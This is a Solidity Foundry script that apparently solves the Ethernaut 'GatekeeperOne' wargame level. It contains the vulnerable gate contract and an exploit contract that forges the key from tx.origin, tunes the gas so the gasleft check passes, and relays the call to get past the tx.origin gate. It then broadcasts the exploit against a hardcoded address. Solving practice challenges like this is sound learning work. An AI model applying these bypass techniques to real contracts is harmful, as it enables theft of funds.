// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GateopenerOne {
    GatekeeperOne public victim;

    constructor(address _targetAddress) {
        victim = GatekeeperOne(_targetAddress);
    }

    function exploit() external returns (bool) {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        (bool success,) = address(victim).call{gas: 282 + 8191}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        return success;
    }
}

contract Attack is Test {
    GateopenerOne level = new GateopenerOne(address(0x2b961E3959b79326A8e7F64Ef0d2d825707669b5));

    function test_attack() external {
        vm.startBroadcast();
        bool success = level.exploit();
        require(success, "Exploit failed");
        vm.stopBroadcast();
    }
}
